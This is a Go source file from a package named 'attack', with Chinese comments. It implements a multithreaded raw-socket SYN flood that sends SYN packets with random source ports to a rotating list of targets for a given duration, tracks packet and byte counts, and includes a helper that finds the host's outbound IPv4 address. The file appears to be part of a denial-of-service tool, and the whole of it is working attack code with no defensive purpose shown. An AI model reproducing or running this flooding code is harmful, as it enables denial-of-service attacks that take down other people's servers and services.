//go:build linux || darwin

package attack

import (
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// runRawSYNFlood 真·SYN 洪水：每线程一个 raw socket（fd 复用），
// 以本机真实出口 IP 为源、随机源端口，fire-and-forget 连发 SYN 包。
// 不等待 SYN-ACK（半开连接压力由目标处理），PPS 只受发送速率限制。
func runRawSYNFlood(s *AttackSession, targets []string, threads int, dur time.Duration, srcIP [4]byte) {
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(seed int64) {
			defer wg.Done()
			rng := NewFastRNG(time.Now().UnixNano() + seed)
			endTime := time.Now().Add(dur)
			tc := newTimeCache()
			var targetIdx uint64

			var conn *SpoofConn
			defer func() {
				if conn != nil {
					conn.Close()
				}
			}()

			for tc.since(endTime) < 0 {
				select {
				case <-s.StopChan:
					return
				default:
				}

				if conn == nil {
					// fd 可发任意目标（Sendto 每次携带目标地址）
					ip, port := SplitTarget(targets[0])
					if port == 0 {
						port = 80
					}
					c, err := NewSpoofConn(ip, port)
					if err != nil {
						// 权限不足等：本线程放弃（任务继续由其他线程打）
						log.Printf("[tcp_syn] raw socket failed: %v", err)
						atomic.AddUint64(&s.Stats.Errors, 1)
						return
					}
					conn = c
				}

				if !s.checkRate(40) { // SYN 包 40B
					time.Sleep(time.Microsecond * 100)
					continue
				}

				tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
				ip, port := SplitTarget(tgt)
				if port == 0 {
					port = 80
				}
				if err := conn.SendSYNRaw(srcIP, ip, port, rng.RandomPort()); err != nil {
					atomic.AddUint64(&s.Stats.Errors, 1)
					continue
				}
				atomic.AddUint64(&s.Stats.PacketsSent, 1)
				atomic.AddUint64(&s.Stats.BytesSent, 40)
				tc.refresh()
			}
		}(int64(i))
	}
	waitGroupTimeout(&wg, 5*time.Second)
}

// outboundIPv4 探测本机出口 IPv4 地址（UDP dial 只做路由查询，不发包）。
// 失败返回全零（调用方回退 Dial 模式）。
func outboundIPv4() [4]byte {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return [4]byte{}
	}
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP.To4()
	if ip == nil {
		return [4]byte{}
	}
	var out [4]byte
	copy(out[:], ip)
	return out
}
